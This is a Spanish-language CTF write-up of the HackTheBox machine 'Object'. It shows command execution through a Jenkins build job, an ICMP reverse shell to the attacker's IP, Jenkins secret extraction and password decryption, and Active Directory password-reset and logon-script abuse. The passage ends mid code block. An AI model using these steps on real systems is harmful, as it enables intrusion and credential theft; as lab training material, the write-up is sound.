<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Object Writeup [ES] - HackTheBox" /><meta property="og:locale" content="en" /><meta name="description" content="Resumen" /><meta property="og:description" content="Resumen" /><link rel="canonical" href="https://brsalcedom.github.io/Object-Writeup-HackTheBox/" /><meta property="og:url" content="https://brsalcedom.github.io/Object-Writeup-HackTheBox/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-14T13:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Object Writeup [ES] - HackTheBox" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-14T13:00:00-03:00","datePublished":"2022-03-14T13:00:00-03:00","description":"Resumen","headline":"Object Writeup [ES] - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/Object-Writeup-HackTheBox/"},"url":"https://brsalcedom.github.io/Object-Writeup-HackTheBox/"}</script><title>Object Writeup [ES] - HackTheBox | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Object Writeup [ES] - HackTheBox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 620 410'%3E%3C/svg%3E" data-src="/images/HTB/Object/00-banner.png" class="preview-img bg" alt="Preview Image" width="620" height="410" data-proofer-ignore><h1 data-toc-skip>Object Writeup [ES] - HackTheBox</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1647273600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-14 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2058 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="resumen">Resumen</h1><p><a href="https://app.hackthebox.com/machines/Object">Object</a> es una máquina <strong>Windows</strong> de dificultad Hard de la plataforma de <a href="https://app.hackthebox.com/">Hack The Box</a>, incluye conceptos de explotación de Active Directory, Bypass de Firewall y ejecución de jobs en Jenkins.</p><p><img data-src="/images/HTB/Object/01-info.png" alt="Info" data-proofer-ignore></p><h1 id="enumeración">Enumeración</h1><h2 id="rustscan---nmap"><span class="mr-2">Rustscan - NMAP</span><a href="#rustscan---nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Como siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará <a href="https://github.com/RustScan/RustScan">Rustscan</a>, proporcionando comandos de nmap para realizar el escaneo desde un one-liner.</p><ul><li><code class="language-plaintext highlighter-rouge">rustscan 10.129.96.147 -- -sCV | tee ports.tcp.nmap</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.

Open 10.10.11.132:80
Open 10.10.11.132:5985
Open 10.10.11.132:8080

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    syn-ack Jetty 9.4.43.v20210629
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.43.v20210629)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><hr /><h2 id="http80"><span class="mr-2">HTTP/80</span><a href="#http80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Lo primero que visualizamos es una web que nos indica el dominio <code class="language-plaintext highlighter-rouge">object.htb</code> en su pie de página y un enlace hacia su <strong>automation server</strong> que nos redirige hacia <code class="language-plaintext highlighter-rouge">object.htb:8080</code>. Esto inmediatamente lo incorporamos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><p><img data-src="/images/HTB/Object/10-website-80.png" alt="" data-proofer-ignore></p><blockquote><p>En este punto intenté enumeración de directorios y de subdominios sin resultados satisfactorios.</p></blockquote><hr /><h2 id="jenkins---http8080"><span class="mr-2">Jenkins - HTTP/8080</span><a href="#jenkins---http8080" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Bajo este puerto y la URL encontrada anteriormente, encontramos panel de inicio para Jenkins, el cual es un server para automatización y despliegue de tareas.</p><p><img data-src="/images/HTB/Object/20-jenkins.png" alt="" data-proofer-ignore></p><p>Como no poseemos credenciales, podemos intentar crear un nuevo user. Crearemos el usuario <code class="language-plaintext highlighter-rouge">cervant:asd123</code>.</p><p><img data-src="/images/HTB/Object/25-jenkins-create-user.png" alt="" data-proofer-ignore></p><p>Iniciaremos sesión y vemos un enlace para crear un nuevo job.</p><p><img data-src="/images/HTB/Object/30-jenkins-login.png" alt="" data-proofer-ignore></p><p>Crearemos un job llamado <strong>test</strong> de tipo <strong>Freestyle project</strong> y le daremos OK.</p><p><img data-src="/images/HTB/Object/32-jenkins-create-job.png" alt="" data-proofer-ignore></p><p>Nos llevará a la siguiente página donde definiremos el detalle del job. Haremos scroll hacia abajo y la sección <strong>Build</strong> es la que nos interesa, ya que ahí es donde podremos inyectar comandos de Windows.</p><p><img data-src="/images/HTB/Object/35-jenkins-build.png" alt="" data-proofer-ignore></p><p>Se nos desplegará un cuadro de texto en donde podremos insertar nuestros comandos. Por ahora solo ejecutaremos un <code class="language-plaintext highlighter-rouge">whoami</code> para validar la correcta ejecución.</p><p><img data-src="/images/HTB/Object/40-command-inject.png" alt="" data-proofer-ignore></p><p>Al finalizar y guardar, nos dejará en el “home” de nuestro job, el problema es que en la sección izquierda el botón para ejecutar la tarea no se nos muestra. Esto puede ser debido a que no poseemos los permisos necesarios para una ejecución manual.</p><p><img data-src="/images/HTB/Object/45-job-home.png" alt="" data-proofer-ignore></p><p>Si volvemos a la configuración de la tarea, podemos ver una sección llamada <strong>Build Triggers</strong>. Acá vemos dos opciones que nos pueden servir:</p><ul><li><strong>Triger builds remotely</strong>: Nos permitirá ejecutarlo remotamente utilizando un API-Token.<li><strong>Build Periodically</strong>: Permitirá la ejecución por calendarización (cron).</ul><p><img data-src="/images/HTB/Object/50-build-triggers.png" alt="" data-proofer-ignore></p><h3 id="ejecución-remota-de-comandos-rce"><span class="mr-2">Ejecución remota de comandos (RCE)</span><a href="#ejecución-remota-de-comandos-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Para ejecutar la tarea automáticamente cada 1 minuto, lo que tendríamos que hacer es agregar <code class="language-plaintext highlighter-rouge">* * * * *</code>.</p><p><img data-src="/images/HTB/Object/55-build-cron.png" alt="" data-proofer-ignore></p><p>Pero esto resulta poco conveniente, ya que nos quita un poco de control. Por lo tanto, procederemos a crear un token y ejecutaremos el job remotamente desde consola.</p><p>Desde la configuración del Job habilitaremos <strong>Triger builds remotely</strong> y asignaremos un nombre de token.</p><p><img data-src="/images/HTB/Object/60-build-token.png" alt="" data-proofer-ignore></p><p>Posteriormente, iremos a la configuración de usuario y crearemos el token.</p><p><img data-src="/images/HTB/Object/65-create-token.png" alt="" data-proofer-ignore></p><p>Ya en tenencia del token, podremos ejecutar la tarea de la siguiente forma:</p><ul><li><code class="language-plaintext highlighter-rouge">http://[USERNAME]:[TOKEN]@[JENKINS-URL]/job/test/build?token=[TOKEN_NAME]</code></ul><p>En nuestro caso, lo gatillaremos desde consola utilizando <code class="language-plaintext highlighter-rouge">curl</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://cervant:11adc4716a1d0e300bdc2ae83b47c8bf14@object.htb:8080/job/test/build?token=CERVANT_TOKEN"</span>
</pre></table></code></div></div><p>No se obtendrá output desde consola, pero inmediatamente veremos la tarea ejecutandose desde la interfaz web.</p><p><img data-src="/images/HTB/Object/70-running-job.png" alt="" data-proofer-ignore></p><p>Al cabo de unos segundos finalizará y podremos ir al detalle de la ejecución. Clicaremos sobre el número de tarea en el panel izquierdo e iremos a <strong>Console Output</strong>.</p><p><img data-src="/images/HTB/Object/72-whoami-output.png" alt="" data-proofer-ignore></p><p>Tenemos ejecución remota de comandos (RCE) con el usuario <code class="language-plaintext highlighter-rouge">object\oliver</code>, en este momento podemos intentar obtener una reverse shell para entrar a la máquina.</p><p>Modificaremos el job y agregaremos una sentencia para obtener una consola utilizando netcat.</p><p><img data-src="/images/HTB/Object/75-job-netcat.png" alt="" data-proofer-ignore></p><p>Como siempre, compartiremos el binario desde la máquina local a través de <strong>smbserver</strong> de <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> e iniciaremos un listener.</p><p><img data-src="/images/HTB/Object/78-listener.png" alt="" data-proofer-ignore></p><p>Ejecutaremos la tarea nuevamente y veremos el output. En este caso, vemos que ha finalizado con un error, indicando que la ruta de red no fué encontrada.</p><p><img data-src="/images/HTB/Object/80-running-job-failure.png" alt="" data-proofer-ignore></p><p>Esto nos indica que hay alguna regla en el Firewall de la máquina <strong>Object</strong> que impide conexiones salientes, ya que en ningún momento se recibió una petición hacia el <strong>smbserver</strong>.</p><p><img data-src="/images/HTB/Object/82-smbserver-without-request.png" alt="" data-proofer-ignore></p><hr /><h1 id="acceso-a-través-de-icmp">Acceso a través de ICMP</h1><p>Ya que sabemos que <strong>TCP</strong> se encuentra bloqueado y muy posiblemente para <strong>UDP</strong> también sea el caso, podriamos validar si tenemos traza <strong>ICMP</strong>. Asi que, nuevamente modificamos la tarea y la ejecutaremos para visualizar su output.</p><p><img data-src="/images/HTB/Object/85-job-icmp.png" alt="" data-proofer-ignore></p><p>Efectivamente tenemos conectividad a través de <strong>ICMP</strong>, por lo que, en lugar de enumerar el sistema a través de Jenkins, entablaremos una reverse shell utilizando este protocolo. En el repositorio de <a href="https://github.com/samratashok/nishang">Nishang</a> podemos encontrar un script en powershell que hace exactamente esto. Especificamente nos interesa <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">Invoke-PowerShellIcmp.ps1</a> si que lo descargaremos y modificaremos.</p><h2 id="icmpsh"><span class="mr-2">icmpsh</span><a href="#icmpsh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Ahora bien, seguimos teniendo el problema de que no podemos conectarnos a nuestra máquina para obtener el archivo de powershell para su ejecución. Para solucionar esto, convertiremos el contenido del archivo a base64 y lo ejecutaremos con <code class="language-plaintext highlighter-rouge">powershell -enc [BASE64]</code> directamente en el job de jenkins.</p><p>Para preparar la correcta ejecución del script, se debe hacer lo siguiente:</p><ol><li>Ejecutar el comando <code class="language-plaintext highlighter-rouge">sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> en nuestra máquina local.<li>Descargar la herramienta <a href="https://github.com/inquisb/icmpsh">icmpsh</a> y ejecutarla para obtener el listener de la reverse shell.<li>Copiar la sentencia <code class="language-plaintext highlighter-rouge">Invoke-PowerShellIcmp -IPAddress 10.10.14.89</code> al final del script para lanzar la consola con una única ejecución.</ol><p><img data-src="/images/HTB/Object/87-prepare-icmp-shell.png" alt="" data-proofer-ignore></p><p><img data-src="/images/HTB/Object/88-prepare-icmp-shell.png" alt="" data-proofer-ignore></p><p>Una vez esto se encuentra realizado, eliminaremos los comentarios y líneas vacías del script para compactar su contenido y encodearlo en <strong>base64</strong>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat </span>icmp.ps1 | iconv <span class="nt">-t</span> utf-16le | <span class="nb">base64</span> <span class="nt">-w</span> 0
</pre></table></code></div></div><p><img data-src="/images/HTB/Object/90-encoded-shell.png" alt="" data-proofer-ignore></p><p>Iremos al job en jenkins y actualizaremos el payload, lo ejecutaremos nuevamente con <code class="language-plaintext highlighter-rouge">curl</code> y al cabo de unos segundos obtendremos la shell.</p><blockquote><p>Importante notar que una shell a través de ICMP es significativamente más lenta que una tradicional.</p></blockquote><p><img data-src="/images/HTB/Object/97-getting-shell.png" alt="" data-proofer-ignore></p><hr /><h1 id="consola-como-oliver">Consola como Oliver</h1><p>Una vez dentro, nos encontraremos en el directorio <code class="language-plaintext highlighter-rouge">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test</code>. Si volvemos al root de Jenkins podremos ubicar los archivos necesarios para descifrar las contraseñas de los usuarios creados. Para esto, requeriremos los archivos <code class="language-plaintext highlighter-rouge">credentials.xml</code>, <code class="language-plaintext highlighter-rouge">master.key</code> y <code class="language-plaintext highlighter-rouge">hudson.util.Secret</code>, el primero se encontrará en el directorio personal del usuario y los otros en el directorio <strong>secret</strong>.</p><p><img data-src="/images/HTB/Object/105-jenkins-root.png" alt="" data-proofer-ignore></p><p>En este caso nos interesan las credenciales del usuario admin.</p><p><img data-src="/images/HTB/Object/102-jenkins-users.png" alt="" data-proofer-ignore></p><p>Encontraremos el archivo <code class="language-plaintext highlighter-rouge">config.xml</code> el cual es equivalente a lo que necesitamos.</p><p><img data-src="/images/HTB/Object/107-jenkins-admin-dir.png" alt="" data-proofer-ignore></p><p>Para efectos de simplicidad, y considerando que el archivo <code class="language-plaintext highlighter-rouge">hudson.util.Secret</code> es un binario, extraeremos todo utilizando encoding en <strong>base64</strong> para luego “decodear” desde nuestra máquina..</p><ul><li>config.xml:</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">users/admin_17207690984073220035/config.xml</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">byte</span><span class="p">))</span><span class="w">
</span></pre></table></code></div></div><ul><li>master.key:</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">secrets/master.key</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">byte</span><span class="p">))</span><span class="w">
</span></pre></table></code></div></div><ul><li>hudson.util.Secret:</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">secrets/hudson.util.Secret</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">byte</span><span class="p">))</span><span class="w">
</span></pre></table></code></div></div><p>Para realizar el decrypt existen unas cuantas herramientas disponibles, una de ellas se encuentra programada en <strong>Go</strong> y pertenece al usuario <a href="https://github.com/thesubtlety">thesubtlety</a>. El repositorio en cuestión es <a href="https://github.com/thesubtlety/go-decrypt-jenkins">go-decrypt-jenkins</a> desde donde descargaremos un binario compilado para linux.</p><p>Una vez descargado será muy fácil de utilizar.</p><p><img data-src="/images/HTB/Object/110-all-files-decrypt.png" alt="" data-proofer-ignore></p><p><img data-src="/images/HTB/Object/115-jenkins-decrypt.png" alt="" data-proofer-ignore></p><p>Introducimos todo lo necesario y obtendremos la contraseña del usuario <strong>oliver</strong>.</p><p><img data-src="/images/HTB/Object/120-jenkins-decrypt.png" alt="" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>oliver:c1cdfun_d2434
</pre></table></code></div></div><p>Con estas credenciales ya podemos ingresar utilizando <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>.</p><p><img data-src="/images/HTB/Object/125-evil-winrm.png" alt="" data-proofer-ignore></p><p>Para enumerar el sistema y descubrir una manera de escalar privlegios, utilizaremos <strong>BloodHound</strong>, pero primero debemos extraer la información desde la máquina. Para ello <a href="https://github.com/BloodHoundAD/SharpHound/">Sharphound</a> en su versión de PowerShell viene de maravilla.</p><blockquote><p>Al momento de escribir este post, la versión de PowerShell de BloodHound no se encuentra disponible en su repositorio original, pero puede ser encontrada en los commits anteriores.</p></blockquote><p>Subiremos el archivo con el comando <code class="language-plaintext highlighter-rouge">upload</code> nativo de <strong>Evil-WinRM</strong>, importaremos el módulo y lo ejecutaremos llamándo a la función <code class="language-plaintext highlighter-rouge">Invoke-BloodHound -CollectionMethod All</code>. Generará un archivo comprimido con toda la data recolectada.</p><p><img data-src="/images/HTB/Object/128-SharpHound.png" alt="" data-proofer-ignore></p><p>Descargaremos el comprimido y lo importaremos a BloodHound para analizarlo.</p><h2 id="bloodhound"><span class="mr-2">BloodHound</span><a href="#bloodhound" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Una vez que ya se encuentra importado nuestro <code class="language-plaintext highlighter-rouge">.zip</code>, lo primero será marcar <strong>Oliver</strong> como <em>Owned</em>.</p><p><img data-src="/images/HTB/Object/130-oliver-bloodhound.png" alt="" data-proofer-ignore></p><p>Posteriormente utilizaremos una de las consultas pre-construidas que contiene BloodHound: <strong>Find Shortest Paths to Domain Admins</strong>. Esto básicamente lo que hará será analizar posibles rutas para escalar privlegios y convertirnos en <strong>Domain Admin</strong> en base a la información obtenida del sistema.</p><p><img data-src="/images/HTB/Object/135-path-to-domainAdmin.png" alt="" data-proofer-ignore></p><p>Como se puede apreciar, nos entrega una ruta bastante directa en donde tendremos que pivotear a través de los usuarios <strong>smith</strong> y <strong>maria</strong> antes de llegar a Administrador de Dominio.</p><hr /><h1 id="consola-como-smith">Consola como Smith</h1><p>La gráfica nos indica que para convertirnos en el usuario <strong>smith</strong> podemos abusar del permiso <code class="language-plaintext highlighter-rouge">ForceChangePassword</code>. Para hacerlo, solamente debemos de ejecutar un simple comando, desde PowerShell sería de la siguiente manera:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">smith</span><span class="w"> </span><span class="nt">-Reset</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s2">"cerv123!"</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Esto seteará la contraseña del usuario <strong>smith</strong> a <code class="language-plaintext highlighter-rouge">cerv123!</code>, lo que nos permitirá ingresar con estas credenciales a través de WinRM.</p><p><img data-src="/images/HTB/Object/138-change-password.png" alt="" data-proofer-ignore></p><hr /><h1 id="consola-como-maria">Consola como Maria</h1><h2 id="logon-script"><span class="mr-2">Logon script</span><a href="#logon-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/images/HTB/Object/140-smith-domain-path.png" alt="" data-proofer-ignore></p><p>Ahora que tenemos acceso desde el usuario <strong>smith</strong>, lo siguiente que debemos hacer es buscar la forma de utilizar <code class="language-plaintext highlighter-rouge">GenericWrite</code>.</p><blockquote><p><strong>Nota:</strong> BloodHound tiene integrado un panel de ayuda en donde se detalla como abusar de cada ACL, pero en este caso no nos será de utilidad.</p></blockquote><p>Si revisamos en HackTricks veremos que hay una <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user">sección</a> en donde se indica que es posible utilizar <code class="language-plaintext highlighter-rouge">GenericWrite</code> para insertar un <strong>logon script</strong>, el cual se ejecutará en cada inicio de sesión del usuario. Esto normalmente no funcionaría en un CTF, ya que se requiere que el usuario inicie sesión antes de que se ejecute nuestro script, pero en esta ocasión es distinto, ya que el usuario Maria se encuentra constantemente logueando el sistema.</p><p>Al revisar la información extraída con <strong>SharpHound</strong> se puede identificar que el último cambio de contraseña del user fué el 22 de Octubre de 2021, pero el último inicio de sesión data del 11 de Marzo 2022 (fecha actual al momento de escribir este writeup).</p><p><img data-src="/images/HTB/Object/145-maria-logon.png" alt="" data-proofer-ignore></p><p>Ahora que sabemos que este método es posible, desde el panel de ayuda de BloodHound podemos obtener el comando a ejecutar (con unas pequeñas modificaciones) para insertar nuestro script.</p><p><img data-src="/images/HTB/Object/153-bloodhound-generic-help.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">Set-DomainObject -Identity [USER] -SET @{scriptpath='[SCRIPT-PATH]'}</code></ul><p>Verificamos que el usuario <strong>maria</strong> no posee ningún Logon Script configurado.</p><p><img data-src="/images/HTB/Object/150-logon-script-info.png" alt="" data-proofer-ignore></p><p>Crearemos nuestro script bajo el directorio Temp para no tener problemas de permisos y le insertaremos el siguiente contenido:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dir C:\Users\maria\Desktop &gt; C:\Temp\Scripts\out.txt
</pre></table></code></div></div><p>Esto nos proporcionará una vía para leer directorios del usuario María, ya que no tenemos la capacidad de cambiar su contraseña o levantar una reverse shell debido a la restricciones de Firewall.</p><p>Pero antes, deberemos importar <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a> ya que de otra manera no nos interpretará el comando. Entonces, los pasos a seguir serán:</p><ul><li>Subir script <code class="language-plaintext highlighter-rouge">PowerView.ps1</code>.<li>Importar su contenido.<li>Ejecutar el comando de PowerShell.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
